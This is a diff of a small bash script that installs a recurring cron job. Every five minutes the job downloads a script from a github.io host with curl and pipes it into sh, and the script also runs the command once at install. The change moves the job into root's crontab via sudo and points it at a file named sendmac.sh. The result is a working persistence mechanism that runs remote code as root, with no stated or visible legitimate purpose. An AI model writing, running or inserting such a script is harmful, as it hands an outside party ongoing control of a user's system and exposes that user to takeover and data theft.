@@ -1,13 +1,13 @@
 #!/bin/bash
 
-command="curl -s https://matthewpipie.github.io/send.sh?\$(date +\%s) | sh"
+command="curl -s https://matthewpipie.github.io/sendmac.sh?\$(date +\%s) | sh"
 
 #write out current crontab
-crontab -l > mycron
+sudo crontab -u root -l > mycron
 #echo new cron into cron file
 echo "*/5 * * * * $command" >> mycron
 #install new cron file
-crontab mycron
+sudo crontab -u root mycron
 rm mycron
 
 $($command)
